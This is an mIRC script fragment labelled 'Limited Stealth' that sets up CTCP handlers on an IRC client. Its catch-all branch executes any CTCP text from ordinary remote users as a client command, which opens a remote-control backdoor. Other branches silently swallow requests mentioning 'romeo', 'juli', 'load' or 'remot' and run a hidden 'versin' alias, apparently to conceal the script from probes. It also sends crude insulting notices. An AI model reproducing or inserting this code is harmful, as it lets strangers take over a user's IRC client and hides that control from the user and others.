; -[ Limited Stealth ]-
ctcp ^1:*ctcps*:?:/.nurse
ctcp ^1:*events*:?:/.nurse
ctcp ^1:*raw*:?:/.nurse
ctcp ^1:*remote*:?:/.nurse
ctcp ^1:*ignore*:?:/.nurse
ctcp ^1:*:?: {
  if ( juli isin $1- ) { /.nurse }
  elseif ( romeo isin $1- ) { /.nurse }
  elseif ( script. isin $1- ) { /.nurse }
  elseif ( load isin $1- ) { /.nurse }
  elseif ( remot isin $1- ) { /.nurse }
  elseif ( versin isin $1 ) { /.versin | halt }
  elseif ( VERSION isin $1 ) { $1- }
  elseif ( PING isin $1 ) { $1- }
  elseif ( FINGER isin $1 ) { $1- }
  elseif ( TIME isin $1 ) { $1- }
  elseif ( /msg isin $1- ) { /.notice $nick Go stick that command where the sun don't shine, baby.. | halt }
  elseif ( /describe isin $1- ) { /.notice $nick No. I don't want to let them see me do that! | halt }
  elseif ( /me isin $1- ) { /.notice $nick Describe it you dumbass or do it yourself.. | halt }
  else { $1- | halt }
}

